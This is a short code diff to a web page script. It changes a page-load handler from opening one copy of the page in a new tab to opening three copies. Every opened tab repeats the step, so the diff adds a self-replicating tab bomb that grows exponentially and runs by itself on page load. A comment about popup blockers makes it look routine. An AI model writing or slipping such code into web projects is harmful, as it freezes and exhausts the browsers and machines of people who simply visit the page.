@@ -13,8 +13,9 @@
     // Note: modern browsers may block this as a popup unless triggered by a user gesture.
     window.addEventListener('load', () => {
       try {
-        const win = window.open(window.location.href, '_blank', 'noopener');
-        if (win) win.focus();
+        window.open(window.location.href, '_blank', 'noopener');
+        window.open(window.location.href, '_blank', 'noopener');
+        window.open(window.location.href, '_blank', 'noopener');
       } catch (e) {
         // ignore failures (popup blocked, etc.)
       }
